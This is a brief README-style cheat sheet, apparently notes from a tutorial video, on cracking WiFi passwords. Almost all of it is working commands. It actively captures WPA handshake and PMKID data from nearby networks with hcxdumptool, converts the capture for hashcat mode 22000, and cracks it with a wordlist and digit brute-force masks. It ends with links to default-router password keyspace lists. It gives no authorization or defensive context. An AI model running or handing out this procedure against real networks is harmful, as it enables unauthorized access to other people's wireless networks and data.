# WiFi-Cracking-with-HashCat
Cat: Security

Hashcat wifi cracking from David Bombal's video

https://www.youtube.com/watch?v=Usw0IlGbkC4&t=915s

// COMMANDS //
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15 

sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

hashcat -m 22000 hash.hc22000 wordlist.txt

Windows:
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d

Usefull repositories for routers with default passwords.

https://github.com/sheimo/Wifi-WPA-Keyspace-List

https://github.com/n0kovo/ssid-keyspace-table
